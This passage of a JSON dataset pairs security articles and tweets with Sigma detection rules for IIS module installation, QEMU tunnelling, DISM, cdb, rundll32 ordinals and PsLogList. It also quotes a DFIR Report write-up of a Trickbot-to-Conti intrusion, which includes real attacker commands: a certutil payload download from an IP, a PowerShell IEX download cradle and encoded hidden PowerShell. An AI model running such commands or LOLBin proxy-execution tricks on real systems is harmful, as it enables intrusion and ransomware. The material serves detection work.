empty assembly flags for .NET rundown\nDescription: The image displays a snippet of code or output, highlighting multiple entries related to .NET assembly information. Each entry includes 'AssemblyFlags' set to '0', indicating that these assemblies do not have specific flags set. The highlighted areas emphasize the repetitive nature of this information, focusing on identifying potential reflective loading of .NET modules within a web server context.\nTranscription: |\n  json\n  {\n    \"AssemblyFlags\": \"0\",\n    \"AssemblyID\": \"0x275358E7970\",\n    \"ClrInstanceID\": \"23\",\n    \"ManagedPdbAge\": \"1\"\n  },\n  {\n    \"AssemblyFlags\": \"0\",\n    \"AssemblyID\": \"0x275358A5B0\",\n    \"ClrInstanceID\": \"23\",\n    \"ManagedPdbAge\": \"1\"\n  },\n  {\n    \"AssemblyFlags\": \"0\",\n    \"AssemblyID\": \"0x275358E6530\",\n    \"ClrInstanceID\": \"23\",\n    \"ManagedPdbAge\": \"1\"\n  },\n  {\n    \"AssemblyFlags\": \"0\",\n    \"AssemblyID\": \"0x275358E6650\",\n    \"ClrInstanceID\": \"23\",\n    \"ManagedPdbAge\": \"1\"\n  }\n```\n\n#### IIS module installation\n\nProcesses which contain appcmd or gacutil within the command line and the parent process w3wp.exe should be investigated for potential installation of malicious IIS modules. The following Defender for Endpoint queries can help detect such malicious IIS module installation:\n\n```\nDeviceProcessEvents\n| where ProcessCommandLine has \"appcmd.exe add module\"\n| where InitiatingProcessParentFileName == \"w3wp.exe\"\n```\n\n```\nDeviceProcessEvents\n| where ProcessCommandLine has \"\\\\gacutil.exe /I\"\n| where InitiatingProcessParentFileName == \"w3wp.exe\"\n```\n\n#### Process creation\n\nProcess creation events with the parent process of w3wp.exe should be monitored for abnormal child processes. For IIS servers that require child processes of w3wp.exe, ignore lists should be created for these child processes to prevent false flags.\n\n```\nDeviceProcessEvents\n| where Timestamp > ago(7d)\n| where InitiatingProcessFileName in~ ('w3wp.exe', 'httpd.exe')\n| where FileName in~ ('cmd.exe', 'powershell.exe', 'cscript.exe', 'wscript.exe', 'net.exe', 'net1.exe', 'ping.exe', 'whoami.exe')\n| summarize instances = count() by ProcessCommandLine, FolderPath, DeviceName, DeviceId\n| order by instances asc\n```\n\n*Query source: Azure-Sentinel/Webserver Executing Suspicious Applications.yaml*\n\nIf one of the Potato-sploits are being used to create processes, the AccountName field may also be “System” while the InitiatingProcessAccountName will be the Application Pool.\n\n## Conclusion\n\nThreat actors use a variety of techniques to conceal their activity when using malicious IIS modules. Enabling additional logging in your environment is recommended to facilitate the detection of these harmful modules. Specifically, IIS servers should enable the optional event log Microsoft IIS Configuration Operational. This log can provide insight into IIS modules being added or removed from the IIS server and track any modifications made to web.config.\n\nIIS Servers should have their web.config and IIS modules monitored for malicious modifications being made. For example, Gacutil.exe and appcmd.exe being executed from w3wp.exe should be monitored for potential installation of IIS modules. Additionally, the bin directories of websites and the default GAC path should be monitored and regularly scanned for malicious modules being created.\n\nHunting for malicious IIS modules can be performed through Microsoft Defender for Endpoint or your EDR of choice, and it should be conducted regularly to detect abnormal w3wp.exe interactions. This can include, but is not limited to, process creation, file creation and named pipe creation. Due to the wide flexibility around how IIS modules can execute malicious code, it’s important to look for irregularities in behavior.\n\nDetecting web exploitation and malicious IIS modules should be a priority for all organizations, and Microsoft DART believes that following the recommendations provided in this blog and along with the monitoring and detection strategies will assist your organization in the detection and response of these threats.",
    "sigma_rule": {
      "title": "New Module Module Added To IIS Server",
      "id": "dd857d3e-0c6e-457b-9b48-e82ae7f86bd7",
      "status": "experimental",
      "description": "Detects the addition of a new module to an IIS server.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "frack113",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/add"
        },
        "filter_main_builtin": {
          "NewValue": [
            "AnonymousAuthenticationModule",
            "CustomErrorModule",
            "DefaultDocumentModule",
            "DirectoryListingModule",
            "FileCacheModule",
            "HttpCacheModule",
            "HttpLoggingModule",
            "ProtocolSupportModule",
            "RequestFilteringModule",
            "StaticCompressionModule",
            "StaticFileModule",
            "TokenCacheModule",
            "UriCacheModule"
          ]
        },
        "filter_main_remove": {
          "NewValue": ""
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_added.yml"
  },
  "40": {
    "url": "https://www.qemu.org/docs/master/system/invocation.html#hxtool-5",
    "markdown": "",
    "sigma_rule": {
      "title": "Potentially Suspicious Usage Of Qemu",
      "id": "5fc297ae-25b6-488a-8f25-cc12ac29b744",
      "status": "test",
      "description": "Detects potentially suspicious execution of the Qemu utility in a Windows environment.\nThreat actors have leveraged this utility and this technique for achieving network access as reported by Kaspersky.\n",
      "references": [
        "https://securelist.com/network-tunneling-with-qemu/111803/",
        "https://www.qemu.org/docs/master/system/invocation.html#hxtool-5"
      ],
      "author": "Muhammad Faisal (@faisalusuf), Hunter Juhan (@threatHNTR)",
      "date": "2024-06-03",
      "tags": [
        "attack.command-and-control",
        "attack.t1090",
        "attack.t1572"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "-m 1M",
            "-m 2M",
            "-m 3M"
          ],
          "CommandLine|contains|all": [
            "restrict=off",
            "-netdev ",
            "connect=",
            "-nographic"
          ]
        },
        "filter_main_normal_usecase": {
          "CommandLine|contains": [
            " -cdrom ",
            " type=virt ",
            " -blockdev "
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_qemu_suspicious_execution.yml"
  },
  "41": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism",
    "markdown": "",
    "sigma_rule": {
      "title": "Dism Remove Online Package",
      "id": "43e32da2-fdd0-4156-90de-50dfd62636f9",
      "status": "test",
      "description": "Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism",
        "https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html"
      ],
      "author": "frack113",
      "date": "2022-01-16",
      "modified": "2022-08-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_dismhost": {
          "Image|endswith": "\\DismHost.exe",
          "ParentCommandLine|contains|all": [
            "/Online",
            "/Disable-Feature"
          ]
        },
        "selection_dism": {
          "Image|endswith": "\\Dism.exe",
          "CommandLine|contains|all": [
            "/Online",
            "/Disable-Feature"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate script"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dism_remove.yml"
  },
  "42": {
    "url": "https://twitter.com/nas_bench/status/1534957360032120833",
    "markdown": "# Post\n\nJun 9, 2022\n\nIn the background, this is basically using \"cdb.exe\" with a debugging script. LOLBAS doesn't seem to have this one documented for cdb (https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/) so here it is.\n\n```\ncdb.exe -c $\"[PathToDebuggingScript]\" [Command]\n```\n\n## Post\n\nJun 9, 2022\n\nWe know from LOLBAS that adplus can be used to dump lsass (https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/). But you can also use it to run arbitrary commands and binaries with the \"-sc\" flag. #lolbin #lolbas\n\n```\nadplus.exe -crash -o [OutputDir] -sc [Command]\n```\n\n## Comment\n\nJun 9, 2022\n\nThe easiest way to get a copy of this script is to run adplus at least once and navigate to the specified output directory. You'll find it named \"DebuggerScript.txt\"",
    "sigma_rule": {
      "title": "Potential Binary Proxy Execution Via Cdb.EXE",
      "id": "b5c7395f-e501-4a08-94d4-57fe7a9da9d2",
      "status": "test",
      "description": "Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/",
        "https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html",
        "https://twitter.com/nas_bench/status/1534957360032120833"
      ],
      "author": "Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-10-26",
      "modified": "2024-04-22",
      "tags": [
        "attack.execution",
        "attack.t1106",
        "attack.defense-evasion",
        "attack.t1218",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cdb.exe"
          },
          {
            "OriginalFileName": "CDB.Exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            " -c ",
            " -cf "
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Legitimate use of debugging tools"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cdb_arbitrary_command_execution.yml"
  },
  "43": {
    "url": "https://github.com/SigmaHQ/sigma/issues/1009",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
      "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
      "related": [
        {
          "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009",
        "https://strontic.github.io/xcyclopedia/library/shell32.dll-65DA072F25DE83D9F83653E3FEA3644D.html"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent_img": {
          "ParentCommandLine|contains": "SHELL32.DLL"
        },
        "selection_parent_ordinal": {
          "ParentCommandLine|contains": [
            "#568",
            "#570",
            "#572",
            "#576"
          ]
        },
        "selection_susp_cli_parent": [
          {
            "ParentCommandLine|contains": [
              "comspec",
              "iex",
              "Invoke-",
              "msiexec",
              "odbcconf",
              "regsvr32"
            ]
          },
          {
            "ParentCommandLine|contains": [
              "\\Desktop\\",
              "\\ProgramData\\",
              "\\Temp\\",
              "\\Users\\Public\\"
            ]
          }
        ],
        "selection_susp_child_img": {
          "Image|endswith": [
            "\\bash.exe",
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\cscript.exe",
            "\\curl.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\msxsl.exe",
            "\\odbcconf.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\schtasks.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "all of selection_parent_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml"
  },
  "44": {
    "url": "https://twitter.com/EricaZelic/status/1614075109827874817",
    "markdown": "# Post\n\nJan 14, 2023\n\nMy nightly Windows reading is never boring:\n\n```image\nDescription: The image is a webpage screenshot about \"PsLogList v2.81,\" a utility from a Resource Kit that enables the dumping of Event Log contents from both local and remote computers. It highlights that PsLogList is similar to elogdump but additionally allows access to remote systems beyond current security credentials. The page includes options for downloading PsTools and displays the publication details.\nTranscription: |\n  **PsLogList v2.81**\n  \n  Article · 03/23/2021 · 2 minutes to read · 4 contributors\n  \n  By Mark Russinovich\n  \n  Published: March 05, 2019\n  \n  Download PsTools (2.7 MB)\n  \n  **Introduction**\n  \n  The Resource Kit comes with a utility, elogdump, that lets you dump the contents of an Event Log on the local or a remote computer. PsLogList is a clone of elogdump except that PsLogList lets you login to remote systems in situations your current set of security credentials would not permit access to the Event Log, and PsLogList retrieves message strings from the computer on which the event log you view resides.\n```\n\n## Comment\n\nJan 14, 2023\n\n```image\nDescription: The image displays a command usage guide for the tool 'psloglist', which is part of the Sysinternals suite. It shows the syntax for using the command, including various parameters such as '@file', '-a', '-b', '-c', and '-d', along with their descriptions. The parameter '-c' is highlighted, indicating its function to 'Clear the event log after displaying.' This image is informative as it provides detailed technical information relevant to cyber threat intelligence.\nTranscription: |\n  usage: psloglist [- ] [\\\\computer,[computer,...] | @file [-u username [-p password]]] [-s [-t delimiter]] [-m #-n #-h #-d #-w][-c][-x][-a mm/dd/yy][-b mm/dd/yy][-f filter][-i ID[,ID,...] | -e ID[,ID,...]] [-o event source[,event source[,...]]] [-q event source[,event source[,...]]] [-l event log file] <eventlog>\n  \n  Parameter     Description\n  @file         Execute the command on each of the computers listed in the file.\n  -a            Dump records timestamped after specified date.\n  -b            Dump records timestamped before specified date.\n  -c            Clear the event log after displaying.\n  -d            Only display records from previous n days.\n```\n\n## Comment\n\nJan 14, 2023\n\ncc @filip_dragovic 😂 since this uses the registry, I wonder if it will pass redirection guard\n\n```image\nDescription: The image displays a section from a guide or documentation regarding the usage of the 'PendMoves' applet, which is part of Sysinternals. It shows command-line output indicating the version of the tool, its copyright information, and an example execution of the command 'pendmoves'. The output specifies a source file path ('C:\\Config.Msi\\3ec7bbbf.rbf') and indicates that the target action is 'DELETE', suggesting that this file is scheduled for deletion at the next reboot.\nTranscription: |\n  C:\\\\pendmoves\n  PendMove v1.2\n  Copyright (C) 2013 Mark Russinovich\n  Sysinternals - www.sysinternals.com\n  \n  Source: C:\\\\Config.Msi\\\\3ec7bbbf.rbf\n  Target: DELETE\n```",
    "sigma_rule": {
      "title": "Suspicious Use of PsLogList",
      "id": "aae1243f-d8af-40d8-ab20-33fc6d0c55bc",
      "status": "test",
      "description": "Detects usage of the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery or delete events logs",
      "references": [
        "https://web.archive.org/web/20231124132223/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/",
        "https://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos",
        "https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Sysinternals/PsLogList",
        "https://twitter.com/EricaZelic/status/1614075109827874817"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-12-18",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1087",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "psloglist.exe"
          },
          {
            "Image|endswith": [
              "\\psloglist.exe",
              "\\psloglist64.exe"
            ]
          }
        ],
        "selection_cli_eventlog": {
          "CommandLine|contains": [
            " security",
            " application",
            " system"
          ]
        },
        "selection_cli_flags": {
          "CommandLine|contains|windash": [
            " -d",
            " -x",
            " -s",
            " -c",
            " -g"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Another tool that uses the command line switches of PsLogList",
        "Legitimate use of PsLogList by an administrator"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psloglist.yml"
  },
  "45": {
    "url": "https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/",
    "markdown": "# BazarCall to Conti Ransomware via Trickbot and Cobalt Strike\n\n**Categories:**\nadfind\nBazarCall\ncobaltstrike\nconti\nransomware\ntrickbot\n\n**Published on:** August 1, 2021\n\n## Intro\n\nThis report will go through an intrusion that went from an Excel file to domain-wide ransomware. The threat actors used BazarCall to install Trickbot in the environment, which downloaded and executed a Cobalt Strike Beacon. From there, the threat actor discovered the internal network before moving laterally to a domain controller for additional discovery. A couple of days later, the threat actors came back and executed Conti ransomware across the domain.\n\nUnfamiliar with BazaCall/BazarCall? Read more here from @MsftSecIntel, @dreadphones, @JCearbhall, and here from @Unit42_Intel & @malware_traffic.\n\n## Summary\n\nIn this intrusion, we observed a number of interesting techniques being leveraged by the threat actors. The threat actors were able to go from initial access to the deployment of Conti ransomware in a matter of hours. The Conti operators chose to wait a couple of days before ransoming the environment. Even though most of the techniques aren’t new or advanced, they have proven to be effective. We have observed the same techniques in other intrusions, and understanding these techniques will allow defenders to disrupt such intrusion activity and deny it in their own networks.\n\nThe Trickbot payload came from a phishing campaign associated with BazarCall, delivering weaponized XLSB files. Upon execution, certutil.exe was copied to `%programdata%` and renamed with random alphanumeric characters. Certutil was used to download and load the Trickbot DLL into memory. Trickbot was automatically tasked to inject into the wermgr.exe process and use its well-known “pwgrab” module to steal browser credentials. As part of further automated tasking, Trickbot performed an initial reconnaissance of the environment using native Windows tools such as nltest.exe and net.exe.\n\nFirst hands-on activity was observed two hours after initial compromise when Trickbot downloaded and executed Cobalt Strike Beacons. To guarantee execution on the beachhead host, multiple payloads were used. One of the Cobalt Strike Beacons was the same payload and command and control infrastructure as used in a prior case. The initial access method for that case was IcedID, which shows that the threat actors utilize various initial access methods to get into environments and accomplish their goals.\n\nOnce access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit. Presence was then expanded on the beachhead by using a PowerShell loader to execute additional Beacons.\n\nWe observed the threat actors having technical issues. One example being with a Beacon unsuccessfully injecting into a process. It is unclear if this was an untrained actor, or there was a configuration issue.\n\nFifteen minutes after domain enumeration, we observed successful lateral movement to two endpoints on the network. Ten minutes after lateral movement, a PowerShell Cobalt Strike loader executed as a service on a server. Even though the execution was not successful, the threat actors kept trying, a total of eight times, until it finally worked. Windows Defender real-time monitoring was then disabled, the LSASS.exe process was dumped using SysInternals ProcDump, and privilege was escalated to “SYSTEM” using named pipe impersonation.\n\nAlmost four hours after initial execution, the threat actors pivoted to a domain controller using domain admin credentials and executed a Cobalt Strike Beacon. Once they had domain controller access, ntdsutil) was used to take a snapshot of “ntds.dit”, saved under “C:\\Perflogs\\1”, for offline password hash extraction. This is a technique that we don’t see very often, but effective nevertheless.\n\nThe threat actors then reran many of the same discovery techniques that were previously executed on the beachhead, including AdFind and BloodHound. This was the last observed hands-on-keyboard activity for a while.\n\nTwo days later, the Cobalt Strike Beacon on the domain controller was once again actively engaged by the threat actors. Psexec, with two separate batch files, were used to execute Conti ransomware on all domain-joined Windows hosts. This final deployment was executed around 6:45 UTC on a Monday morning.\n\nFrom the point the threat actors returned, to ransom deployment, it was less than 30 minutes. This would give defenders little time to act if they had not identified and contained the activity from the first day of the Trickbot infection.\n\n## Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here. Two of the Cobalt Strike servers used in this intrusion were added to our Threat Feed on 6/3/21 and the other one was added on 6/11/21.\n\nWe also have artifacts available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline illustrating the sequence of events in the BazarCall attack leading to the deployment of Conti ransomware via Trickbot and Cobalt Strike. It includes timestamps and specific actions taken at each stage, such as 'User Execution', 'Credential Access', 'AD Enumeration', and 'Defense Evasion'. Each event lists associated commands or executables, along with the time in UTC, providing a clear flow of the attack process.\nTranscription: |\n  BazarCall to Conti Ransomware via Trickbot and Cobalt Strike\n  \n  11:58:40 UTC - User Execution\n      REGSVR32.EXE\n  \n  12:33:29 UTC - Harvesting credentials from Browsers\n      esentutl\n      TrickBot pwgrab module\n  \n  12:34:11 UTC - Discovery\n      Whoami /groups\n      net localgroup administrators\n      nltest /DOMAIN_TRUSTS /ALL_TRUSTS\n      ....\n  \n  14:03:31 UTC - Cobalt Strike C2\n      Wermgr.exe\n      88.80.147.101:443\n  \n  14:18:54 UTC - AdFind Executed\n      ADFIND.EXE\n  \n  14:23:47 UTC - AD Enumeration\n      DLLHOST.EXE\n      BloodHound\n      Staging folder: C:\\Windows\\Temp\\Dogi\n  \n  14:35:47 UTC - Lateral Movement\n      WMIC\n      l65.bat\n  \n  14:44:12 UTC - Defense Evasion\n      WMI\n      Disable Windows Defender\n  \n  14:56:16 UTC - Credential Access\n      PROCDUMP.EXE\n  \n  15:23:46 UTC - DC Lateral Movement\n      CobaltStrike beacon\n  \n  15:30:36 UTC - Credential Access - NTDS.DIT Collection\n      NTDSUTIL.EXE\n  \n  15:30:39 UTC - DC Defense Evasion\n      Disable Windows Defender\n      DEF.BAT\n  \n  06:45:50 [Day 3] UTC - Impact - Data Encrypted\n      PSEXEC.EXE\n      Conti\n```\n\n## Initial Access\n\nThe initial access was achieved as a result of the user opening what appeared to be a benign workbook, a lure, requiring little user interaction.\n\nThe workbook contained hidden and password-protected worksheets, these were malicious. Module functions also indicated code designed to obfuscate and hide true values and functions.\n\n```image\nAlt: Malicious Workbook\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code. It shows a public function named 'PuGvV' that utilizes a regular expression to manipulate a string. The code appears to be part of a malicious script, as indicated by the context of its association with the BazarCall campaign related to ransomware. The pattern being matched within the code is indicative of obfuscation techniques commonly used in malware to hide its true purpose.\nTranscription: |\n  Public Function PuGvV(JOwETK6iQv As String) As String\n      Set wubH5o = CreateObject(\"VBScript.RegExp\")\n      Kf0V1476 = Array(JOwETK6iQv)\n      With wubH5o\n          .Pattern = \"B|j|d|q|P|K|Z|L|U|2|F|w|V|N|Q|K|G|H|Y\"\n          .Global = True\n      End With\n      PuGvV = wubH5o.Replace(Kf0V1476(0), \"\")\n  End Function\n```\n\nThis document and the following DLL were noted as being associated with a BazarCall campaign by @ffforward.\n\n## Execution\n\nFrom the xlsb document, the following execution chain occurs. Including copying the Windows CertUtil program and using that to collect further Trickbot payloads.\n\n```image\nAlt: Execution Chain\nDescription: The image is a detailed process tree or execution chain diagram, showing the various processes involved in a cyber attack scenario. It lists multiple executable files and their corresponding paths, highlighting the sequence of commands executed through the Windows Command Prompt (cmd.exe) and the rundll32.exe process. Notably, it includes the execution of a malicious payload (TTObk2.exe) downloaded to a user's AppData directory, along with parameters used for the execution and network communication. The diagram serves as a visual representation of the methods employed by the attackers, providing insight into the tactics and techniques of the threat actor.\nTranscription: |\n  Processes\n  C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\n  \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\" \"C:\\Users\\Admin\\AppData\\Local\\Temp\\cancel_sub_VCP1234567890123.xlsb\"\n  \n  C:\\Windows\\System32\\cmd.exe\n  \"C:\\Windows\\System32\\cmd.exe\" /c mkdir %programdata%\\TTObk2 && cd %systemRoot%\\System32\\certutil.exe %programdata%\\TTObk2\\TTObk2.exe\n  \n  C:\\programdata\\TTObk2\\TTObk2.exe\n  \"c:\\programdata\\TTObk2\\TTObk2.exe\" -urlcache -f -split http://195.123.235.51 c:\\programdata\\TTObk2\\TTObk2.dll\n  \n  C:\\Windows\\System32\\cmd.exe\n  \"C:\\Windows\\System32\\cmd.exe\" /c rundll32 %programdata%\\TTObk2.dll,StartW\n  \n  C:\\Windows\\System32\\rundll32.exe\n  rundll32 C:\\ProgramData\\TTObk2.dll,StartW\n```\n\nWe observed a second stage execution using regsvr32 to load a DLL from the user’s `AppData\\Local\\Temp` folder.\n\n```image\nAlt: Second Stage Execution\nDescription: The image displays technical details about the execution of the 'regsvr32' command, specifically regarding its use in the context of a cyber attack. It includes the description of the process (Microsoft Register Server), product details (Microsoft Windows Operating System), and the command line used to execute the DLL from the user's temporary folder. This information is relevant for understanding the execution chain of the malware involved in the attack.\nTranscription: |\n  Description: Microsoft(C) Register Server\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: REGSVR32.EXE\n  CommandLine: regsvr32 /s C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\87402c2ee3959cd862ddb82648aa9ebf17d41ceb05f912e50493dba96acb9a4.dll\n```\n\nAlmost immediately an outbound IPv4 address lookup was requested via HTTP. This is usually undertaken to identify the compromised environment, and to facilitate C2. The user agent refers to Curl – and used again for another stage of the intrusion.\n\n```image\nAlt: IPv4 Lookup\nDescription: The image displays a snippet of HTTP request headers, specifically showing the 'User-Agent' and 'Host' fields. The User-Agent indicates the use of 'curl/7.74.0', a command-line tool for transferring data, while the Host field references 'wtfismyip.com', a service commonly used to check external IP addresses. This information is relevant for understanding the network communication that could indicate potentially malicious behavior in the context of a cyber attack.\nTranscription: |\n  User-Agent: curl/7.74.0\n  Host: wtfismyip.com\n```\n\nOn the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process “wermgr.exe”. The executables were identified as Cobalt Strike and communicated over port 443 to C2 88.80.147[.]101.\n\n```image\nAlt: Cobalt Strike Communication\nDescription: The image is a screenshot of a terminal or command-line interface displaying logs related to a malware execution chain. It shows multiple entries of the executable 'wermgr.exe' located in 'C:\\Windows\\system32\\' and lists corresponding target filenames in the user's 'AppData\\Local\\Temp' directory. Each entry shows the original image path and the target filename where the malware executable is being saved, indicating the potential manipulation or use of the Windows Error Reporting Manager for malicious purposes.\nTranscription: |\n  Image: C:\\Windows\\system32\\wermgr.exe\n  TargetFilename: C:\\Users\\XXXXXX\\AppData\\Local\\Temp\\tdr5BDD.exe\n  Image: C:\\Windows\\system32\\wermgr.exe\n  TargetFilename: C:\\Users\\XXXXXX\\AppData\\Local\\Temp\\tdr3F89.exe\n  Image: C:\\Windows\\system32\\wermgr.exe\n  TargetFilename: C:\\Users\\XXXXXX\\AppData\\Local\\Temp\\tdr2269.exe\n  Image: C:\\Windows\\system32\\wermgr.exe\n  TargetFilename: C:\\Users\\XXXXXX\\AppData\\Local\\Temp\\tdr615.exe\n  Image: C:\\Windows\\system32\\wermgr.exe\n  TargetFilename: C:\\Users\\XXXXXX\\AppData\\Local\\Temp\\tdr934.exe\n```\n\nA PowerShell download cradle was then used to execute Cobalt Strike Beacon in memory:\n\n```image\nAlt: PowerShell Download Cradle\nDescription: The image depicts a PowerShell command line execution. It shows a command that invokes PowerShell with parameters to execute a script hidden from the user interface. The script uses the 'Invoke-Expression' (IEX) command to download and execute a string from a specified URL. The command highlights the technique often used by attackers to execute remote scripts on compromised systems.\nTranscription: C:\\Windows\\system32\\cmd.exe /C powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://onlineworkercz.com:443/ahwjehef'))\"\n```\n\n## Privilege Escalation\n\nNamed pipe impersonation was used to escalate to SYSTEM privileges – a common Cobalt Strike capability:\n\n```image\nAlt: Named Pipe Impersonation\nDescription: The image displays a table with details about processes related to privilege escalation attempts. It includes columns for 'ParentImage', 'ParentCommandLine', 'Image', and 'CommandLine'. Each entry lists the executable paths and command lines associated with process execution, reflecting an attempt to escalate permissions through named pipe impersonation.\nTranscription: |\n  | ParentImage                     | ParentCommandLine               | Image                       | CommandLine                                                       |\n  | ------------------------------- | ------------------------------- | --------------------------- | ----------------------------------------------------------------- |\n  | C:\\Windows\\System32\\wuauclt.exe | C:\\Windows\\system32\\WUAUCLT.exe | C:\\Windows\\System32\\cmd.exe | C:\\Windows\\system32\\cmd.exe /c echo b30f789ed5b > \\\\.\\pipe\\2b5fe9 |\n```\n\nWe observed several attempts by the threat actor trying to escalate to SYSTEM – ultimately succeeding, as evident in several new services running under the Local SYSTEM context:\n\n```image\nAlt: Service Creation\nDescription: The image is a screenshot of a Windows Event Viewer log, specifically showing details related to Event ID 7045, which indicates that a service was installed on the system. The log includes the Service Name, Service File Name, Log Name, Source, and other details pertinent to the service installation. The Service File Name appears to include PowerShell commands, which suggests potential malicious activity or privilege escalation attempts.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  General\n  Details\n  A service was installed in the system.\n  \n  Service Name: d85b4b2\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzA0DtBIAIAQLBQAQBIAGMABIAIAEKAIAE0A2QTAwBzBFAmAABMAAABEA...\n```\n\nService creation events System Event ID 7045, coupled with unusual commands and service names are a strong indication of privilege escalation activity. RedCanary provided useful background on GetSystem capabilities of offensive security tools and methods of detection.\n\n## Defense Evasion\n\nTrickbot made extensive use of process injection to hide in benign operating system processes. It first injected into wermgr.exe and then later into 